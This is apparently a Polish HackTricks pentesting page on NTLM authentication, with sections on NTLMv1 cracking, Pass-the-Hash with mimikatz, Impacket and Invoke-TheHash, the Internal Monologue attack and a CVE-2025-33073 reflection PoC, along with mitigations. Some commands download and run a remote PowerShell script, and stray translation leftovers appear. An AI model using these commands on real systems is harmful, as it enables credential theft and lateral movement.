# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

W środowiskach, w których działają **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), choć powszechnie wiadomo, że można je łatwo złamać. Konkretny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje, że LM nie jest używany i reprezentuje hash pustego ciągu znaków.

Domyślnie podstawową metodą jest protokół uwierzytelniania **Kerberos**. NTLM (NT LAN Manager) jest używany w określonych sytuacjach: przy braku Active Directory, nieistnieniu domeny, nieprawidłowym działaniu Kerberos z powodu błędnej konfiguracji lub podczas nawiązywania połączeń przy użyciu adresu IP zamiast prawidłowej nazwy hosta.

Obecność nagłówka **"NTLMSSP"** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.

Obsługę protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - zapewnia konkretna biblioteka DLL znajdująca się w `%windir%\Windows\System32\msv1\_0.dll`.

**Najważniejsze informacje**:

- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że LM nie jest używany.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych sytuacjach.
- Pakiety uwierzytelniania NTLM można rozpoznać po nagłówku "NTLMSSP".
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Zasady lokalne -> Opcje zabezpieczeń -> Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Uruchom secpol.msc - Zasady lokalne - Opcje zabezpieczeń - Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5)](<../../images/image (919).png>)

### Rejestr

Spowoduje to ustawienie poziomu 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Podstawowy schemat uwierzytelniania domenowego NTLM

1. **użytkownik** wprowadza swoje **dane uwierzytelniające**
2. Maszyna kliencka **wysyła żądanie uwierzytelnienia**, przesyłając **nazwę domeny** i **nazwę użytkownika**
3. **Serwer** wysyła **challenge**
4. **Klient szyfruje** **challenge**, używając hash hasła jako klucza, i wysyła go jako odpowiedź
5. **Serwer wysyła** do **Domain Controller** **nazwę domeny, nazwę użytkownika, challenge i odpowiedź**. Jeśli **nie ma** skonfigurowanego Active Directory lub nazwa domeny jest nazwą serwera, dane uwierzytelniające są **sprawdzane lokalnie**.
6. **Domain Controller sprawdza, czy wszystko się zgadza**, i wysyła informacje do serwera

**Serwer** i **Domain Controller** mogą utworzyć **Secure Channel** za pośrednictwem serwera **Netlogon**, ponieważ Domain Controller zna hasło serwera (znajduje się ono w bazie danych **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie przebiega tak jak opisano **wcześniej, ale** **serwer** zna **hash użytkownika**, który próbuje się uwierzytelnić, zapisany w pliku **SAM**. Zamiast pytać Domain Controller, **serwer sam sprawdzi**, czy użytkownik może się uwierzytelnić.

### NTLMv1 Challenge

**Długość challenge wynosi 8 bajtów**, a **odpowiedź ma długość 24 bajtów**.

**Hash NT (16 bajtów)** jest dzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniana zerami**. Następnie **challenge** jest **szyfrowany osobno** za pomocą każdej części, a **wynikowe** zaszyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24 bajty.

**Problemy**:

- Brak **losowości**
- 3 części mogą być **atakowane osobno** w celu znalezienia hash NT
- **DES można złamać**
- Trzeci klucz jest zawsze złożony z **5 zer**.
- Przy podaniu **tego samego challenge** **odpowiedź** będzie **taka sama**. Można więc przekazać ofierze jako **challenge** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **precomputed rainbow tables**.

### Atak NTLMv1

Obecnie coraz rzadziej można znaleźć środowiska ze skonfigurowanym Unconstrained Delegation, ale nie oznacza to, że nie można **nadużyć usługi Print Spooler**.

Możesz nadużyć niektórych danych uwierzytelniających/sesji, które już posiadasz w AD, aby **poprosić drukarkę o uwierzytelnienie** względem **hosta znajdującego się pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić challenge uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i, jeśli użyto **NTLMv1**, będzie można ją **złamać**.\
Jeśli używasz `responder`, możesz spróbować **użyć flagi `--lm`**, aby spróbować **obniżyć poziom** **uwierzytelniania**.\
_Należy pamiętać, że w przypadku tej techniki uwierzytelnianie musi odbywać się z użyciem NTLMv1 (NTLMv2 jest nieprawidłowy)._

Pamiętaj, że drukarka użyje podczas uwierzytelniania konta komputera, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie uda się złamać** przy użyciu typowych **słowników**. Jednak uwierzytelnianie **NTLMv1** **używa DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc korzystając z usług przeznaczonych specjalnie do łamania DES, będzie można je złamać (możesz na przykład użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com)).

### Atak NTLMv1 za pomocą hashcat

NTLMv1 można również złamać za pomocą NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), który formatuje wiadomości NTLMv1 w sposób umożliwiający ich złamanie za pomocą hashcat.<sup>[[1]](#references)</sup>

Polecenie
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
wyświetliłoby poniższe:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (dystrybucja jest najlepsza za pośrednictwem narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku znamy hasło do tego konta — jest to `password` — więc na potrzeby demonstracji oszukamy:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć `hashcat-utilities`, aby przekonwertować złamane klucze DES na części hasha NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Na koniec ostatnia część:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Długość challenge wynosi 8 bajtów** i wysyłane są **2 responses**: jeden ma długość **24 bajtów**, a długość **drugiego jest zmienna**.

**Pierwszy response** jest tworzony przez zaszyfrowanie za pomocą **HMAC_MD5** **stringa** złożonego z **clienta i domeny**, przy użyciu jako **key** **hasha MD4** z **NT hasha**. Następnie **wynik** jest używany jako **key** do zaszyfrowania za pomocą **HMAC_MD5** wartości **challenge**. Do tego dodawany jest **client challenge o długości 8 bajtów**. Łącznie: 24 B.

**Drugi response** jest tworzony przy użyciu **kilku wartości** (nowego client challenge, **timestampu** zapobiegającego **replay attacks**...)

Jeśli masz **pcap**, w którym przechwycono pomyślny proces uwierzytelniania, możesz skorzystać z tego poradnika, aby uzyskać domenę, username, challenge i response, a następnie spróbować crackować hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Gdy masz już hash ofiary**, możesz użyć go do **impersonate** jej.\
Musisz użyć **tool**, który **wykona** **NTLM authentication using** ten **hash**, **lub** możesz utworzyć nowy **sessionlogon** i **inject** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **NTLM authentication** używany był **ten hash.** To właśnie robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash możesz przeprowadzać również przy użyciu Computer accounts.**

### **Mimikatz**

**Musi zostać uruchomiony jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Spowoduje to uruchomienie procesu, który będzie należeć do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane credentials to te znajdujące się w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych tak, jakbyś był tym użytkownikiem (podobnie jak w przypadku sztuczki `runas /netonly`, ale nie musisz znać hasła w plain-text).

### Pass-the-Hash from linux

Możesz uzyskać code execution na maszynach Windows przy użyciu Pass-the-Hash z Linux.\
[**Kliknij tutaj, aby dowiedzieć się, jak to zrobić.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Skompilowane narzędzia Impacket dla Windows

Możesz pobrać[ pliki binarne impacket dla Windows tutaj](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (W tym przypadku musisz określić command; cmd.exe i powershell.exe nie są prawidłowe do uzyskania interaktywnego shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Istnieje jeszcze kilka innych plików binarnych Impacket...

### Invoke-TheHash

Możesz pobrać skrypty powershell stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ta funkcja to **mieszanka wszystkich pozostałych**. Możesz przekazać **kilka hostów**, **wykluczyć** niektóre i **wybrać** **opcję**, której chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **SMBExec** lub **WMIExec**, ale **nie podasz** parametru _**Command**_, funkcja tylko **sprawdzi**, czy masz **wystarczające uprawnienia**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Należy uruchomić jako administrator**

To narzędzie wykonuje tę samą operację co mimikatz (modyfikuje pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ręczne zdalne wykonywanie poleceń w Windows przy użyciu nazwy użytkownika i hasła


{{#ref}}
../lateral-movement/
{{#endref}}

## Wyodrębnianie poświadczeń z hosta Windows

**Więcej informacji o tym,** [**jak uzyskać poświadczenia z hosta Windows, znajdziesz na tej stronie**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack to stealthy technika wyodrębniania poświadczeń, która umożliwia atakującemu pobranie hashy NTLM z komputera ofiary **bez bezpośredniej interakcji z procesem LSASS**. W przeciwieństwie do Mimikatz, który odczytuje hashe bezpośrednio z pamięci i jest często blokowany przez endpoint security lub Credential Guard, ten atak wykorzystuje **lokalne wywołania pakietu uwierzytelniania NTLM (MSV1_0) za pośrednictwem Security Support Provider Interface (SSPI)**. Najpierw atakujący **obniża ustawienia NTLM** (np. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), aby zezwolić na NetNTLMv1. Następnie podszywa się pod istniejące tokeny użytkowników uzyskane z uruchomionych procesów i lokalnie wyzwala uwierzytelnianie NTLM w celu wygenerowania odpowiedzi NetNTLMv1 przy użyciu znanego challenge.<sup>[[4]](#references)</sup>

Po przechwyceniu tych odpowiedzi NetNTLMv1 atakujący może szybko odzyskać oryginalne hashe NTLM za pomocą **wstępnie obliczonych rainbow tables**, umożliwiając dalsze ataki Pass-the-Hash w celu lateral movement. Co ważne, Internal Monologue Attack pozostaje stealthy, ponieważ nie generuje ruchu sieciowego, nie wstrzykuje kodu ani nie wywołuje bezpośrednich zrzutów pamięci, przez co jest trudniejszy do wykrycia przez obrońców niż tradycyjne metody, takie jak Mimikatz.

Jeśli NetNTLMv1 nie jest akceptowany — z powodu wymuszonych security policies — atakujący może nie zdołać uzyskać odpowiedzi NetNTLMv1.

Aby obsłużyć ten przypadek, narzędzie Internal Monologue zostało zaktualizowane: dynamicznie pozyskuje token serwera za pomocą `AcceptSecurityContext()`, aby nadal **przechwytywać odpowiedzi NetNTLMv2**, jeśli NetNTLMv1 zawiedzie. Chociaż NetNTLMv2 jest znacznie trudniejszy do złamania, nadal umożliwia relay attacks lub offline brute-force w ograniczonych przypadkach.

PoC można znaleźć w **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Bardziej szczegółowy przewodnik dotyczący przeprowadzania tych ataków znajdziesz tutaj:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsowanie challenge NTLM z przechwyconego ruchu sieciowego

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* przez Serialized SPNs (CVE-2025-33073)

Windows zawiera kilka mechanizmów ochronnych, które mają zapobiegać atakom *reflection*, w których uwierzytelnianie NTLM (lub Kerberos) pochodzące z hosta jest przekazywane z powrotem do **tego samego** hosta w celu uzyskania uprawnień SYSTEM.

Microsoft zablokował większość publicznie znanych chainów za pomocą MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) oraz późniejszych poprawek, jednak **CVE-2025-33073** pokazuje, że zabezpieczenia te nadal można obejść, wykorzystując sposób, w jaki **klient SMB obcina Service Principal Names (SPNs)** zawierające *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR błędu
1. Atakujący rejestruje **rekord DNS A**, którego etykieta koduje marshalled SPN — np.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Ofiara zostaje zmuszona do uwierzytelnienia się względem tej nazwy hosta (PetitPotam, DFSCoerce itd.).
3. Gdy klient SMB przekazuje ciąg docelowy `cifs/srv11UWhRCAAAAA…` do `lsasrv!LsapCheckMarshalledTargetInfo`, wywołanie `CredUnmarshalTargetInfo` **usuwa** serialized blob, pozostawiając **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (lub odpowiednik Kerberos) uznaje teraz cel za *localhost*, ponieważ skrócona część hosta odpowiada nazwie komputera (`SRV1`).
5. W rezultacie serwer ustawia `NTLMSSP_NEGOTIATE_LOCAL_CALL` i wstrzykuje **token dostępu SYSTEM procesu LSASS** do kontekstu (w przypadku Kerberos tworzony jest oznaczony jako SYSTEM subsession key).
6. Przekazanie tego uwierzytelniania za pomocą `ntlmrelayx.py` **lub** `krbrelayx.py` zapewnia pełne uprawnienia SYSTEM na tym samym hoście.<sup>[[5]](#references)</sup>

### Szybki PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch i mitigacje
* Patch KB dla **CVE-2025-33073** dodaje kontrolę w `mrxsmb.sys::SmbCeCreateSrvCall`, która blokuje każde połączenie SMB, którego cel zawiera marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Wymuś **SMB signing**, aby zapobiec reflection nawet na niezałatanych hostach.
* Monitoruj rekordy DNS przypominające `*<base64>...*` i blokuj wektory coercion (PetitPotam, DFSCoerce, AuthIP...).

### Pomysły na detekcję
* Przechwycenia sieciowe z `NTLMSSP_NEGOTIATE_LOCAL_CALL`, gdy IP klienta ≠ IP serwera.
* Kerberos AP-REQ zawierające subsession key oraz client principal równy nazwie hosta.
* Logowania SYSTEM w zdarzeniach Windows 4624/4648, bezpośrednio poprzedzające zdalne zapisy SMB z tego samego hosta.<sup>[[5]](#references)</sup>

Informacje na temat **March 2026** local reflection variant, która wykorzystuje **SMB arbitrary ports** i **TCP connection reuse**, aby uzyskać `NT AUTHORITY\SYSTEM`, znajdziesz tutaj:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
